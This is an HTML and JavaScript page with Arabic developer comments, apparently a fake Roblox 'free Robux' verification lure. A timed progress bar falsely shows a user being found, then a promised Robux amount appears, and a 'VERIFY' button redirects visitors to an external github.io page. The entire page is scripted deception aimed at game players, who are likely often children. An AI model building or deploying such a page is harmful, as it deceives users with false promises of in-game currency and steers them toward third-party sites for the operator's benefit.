<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">

<!-- خلفية الذرات 3D -->
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<style>
  :root{
    --accent:#7b2cff; --accent-dark:#5a1fd1;
    --card-w:420px; --radius:20px;
    --ink:#101418; --muted:#6b7280;
  }
  /* خلفية الذرات */
  #particles-js{position:fixed;inset:0;z-index:-1;background:#eef0ea}

  body{margin:0;font-family:Inter,sans-serif;display:grid;place-items:center;min-height:100vh;color:var(--ink)}
  .card{
    width:min(var(--card-w),92vw); background:#fff; border-radius:var(--radius);
    border:3px solid var(--accent); box-shadow:0 14px 30px rgba(123,44,255,.25);
    padding:28px 20px 34px; text-align:center; position:relative;
  }
  .brand-bar{
    position:absolute; left:50%; top:-30px; transform:translateX(-50%);
    background:#fff; border:3px solid var(--accent); border-radius:16px; padding:8px 18px;
    box-shadow:0 8px 20px rgba(123,44,255,.25);
  }
  .brand{height:34px}

  h1{margin:36px 0 6px; letter-spacing:.18em}
  .muted{color:var(--muted); font-size:.92rem}

  /* مرحلة التحميل */
  .status-wrap{margin-top:16px; display:grid; place-items:center; gap:12px}
  .stage-icon{
    width:64px; height:64px; border-radius:16px; display:grid; place-items:center;
    background:#f7f7fc; border:2px solid #e1e1ec; margin-bottom:4px;
    box-shadow:inset 0 1px 0 #fff, 0 6px 16px #00000012;
    font-size:32px;
  }
  .stage-title{font-weight:900; letter-spacing:.2em; color:#6b7280; font-size:.9rem}
  .who{font-weight:800; font-size:1.05rem}

  .bar{height:14px; width:100%; background:#ececf5; border:1px solid #e6e6f3; border-radius:14px; overflow:hidden}
  .fill{height:100%; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent-dark)); transition:width .2s linear}

  /* قسم التحقق النهائي */
  .verify{display:none; margin-top:10px}
  .verify .title{font-weight:900; letter-spacing:.18em; color:#6b7280; margin-bottom:6px}
  .rbx-box{
    background:#f7f7fc; border:2px solid #e1e1ec; border-radius:20px;
    padding:16px; font-weight:900; font-size:18px; margin:12px auto 16px; width:220px;
    box-shadow:inset 0 1px 0 #fff, 0 8px 18px #00000012;
  }
  .cta{
    width:100%; height:60px; border:0; border-radius:16px;
    background:linear-gradient(180deg,var(--accent),var(--accent-dark));
    color:#fff; font-weight:900; font-size:20px; cursor:pointer;
    box-shadow:0 12px 26px rgba(123,44,255,.4);
  }
  .cta:hover{transform:translateY(-2px)}
</style>
</head>
<body>
<div id="particles-js"></div>

<section class="card" aria-label="Verification">
  <div class="brand-bar">
    <!-- ❗ غيّر رابط اللوجو هنا (لو ما يشتغل رابطك الماضي) -->
    <img class="brand" src="https://i.imgflip.com/6s50u1.png" alt="ROBLOX">
  </div>

  <h1>VERIFICATION</h1>
  <div class="muted">Please hold while we process your request.</div>

  <!-- مراحل التحميل -->
  <div id="stage" class="status-wrap">
    <div id="icon" class="stage-icon">🔍</div>
    <div id="stageTitle" class="stage-title">SEARCHING FOR</div>
    <div id="who" class="who">—</div>
    <div class="bar"><div id="fill" class="fill"></div></div>
  </div>

  <!-- بعد المراحل -->
  <div id="verifyBlock" class="verify">
    <div class="title">VERIFICATION</div>
    <h2 id="vUser" style="margin:6px 0 4px">—</h2>
    <p class="muted">Your request is ready. Please complete verification to proceed.</p>
    <div class="rbx-box"><span id="vAmount">0</span> Robux</div>
    <button id="verifyBtn" class="cta">VERIFY</button>
    <p class="muted" style="margin-top:10px">.</p>
  </div>
</section>

<script>
  /* تهيئة الخلفية الذرّية */
  particlesJS("particles-js",{
    particles:{number:{value:70,density:{enable:true,value_area:800}},
      color:{value:"#7b2cff"},shape:{type:"circle"},
      opacity:{value:.6,random:true},size:{value:4,random:true},
      line_linked:{enable:true,distance:150,color:"#7b2cff",opacity:.4,width:1},
      move:{enable:true,speed:2,direction:"none",out_mode:"out"}},
    interactivity:{detect_on:"canvas",
      events:{onhover:{enable:true,mode:"grab"},onclick:{enable:true,mode:"push"}},
      modes:{grab:{distance:140,line_linked:{opacity:.8}},push:{particles_nb:3}}},
    retina_detect:true
  });

  /* استرجاع الاسم والروبكس من الصفحة الأولى */
  const params=new URLSearchParams(location.search);
  const store=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
  const username = (store.u || params.get('u') || 'Guest').trim();
  const robux    = Number(store.r || params.get('r') || 1000);

  // عرضهم من البداية
  document.getElementById('who').textContent = `${username} — ${robux.toLocaleString()} Robux`;

  // مراحل التقدم
  const icon = document.getElementById('icon');
  const title= document.getElementById('stageTitle');
  const fill = document.getElementById('fill');
  const stage= document.getElementById('stage');
  const verifyBlock = document.getElementById('verifyBlock');
  const vUser = document.getElementById('vUser');
  const vAmount = document.getElementById('vAmount');

  let t0=performance.now();
  const total=9000; // المدة الإجمالية ~9 ثواني
  function tick(now){
    const p = Math.min(1,(now - t0)/total);
    fill.style.width = (p*100).toFixed(1)+'%';

    if (p < .25){
      title.textContent = 'SEARCHING FOR'; icon.textContent = '🔍';
    } else if (p < .5){
      title.textContent = 'USER FOUND'; icon.textContent = '✅';
    } else if (p < .8){
      title.textContent = 'LOADING…'; icon.textContent = '⚙️';
    } else {
      title.textContent = 'verify requirement'; icon.textContent = '❌';
    }

    if (p < 1){ requestAnimationFrame(tick); }
    else {
      // إظهار التحقق
      stage.style.display='none';
      verifyBlock.style.display='block';
      vUser.textContent = username;
      vAmount.textContent = robux.toLocaleString();
    }
  }
  requestAnimationFrame(tick);

  /* زر VERIFY → رابط إنستا (عدّله هنا) */
  const INSTAGRAM_URL = "https://gnesvas.github.io/chjan/"; // مثال: "https://instagram.com/YOUR_USERNAME"
  document.getElementById('verifyBtn').onclick = ()=>{ if(INSTAGRAM_URL) location.href = INSTAGRAM_URL; };
</script>
</body>
</html>
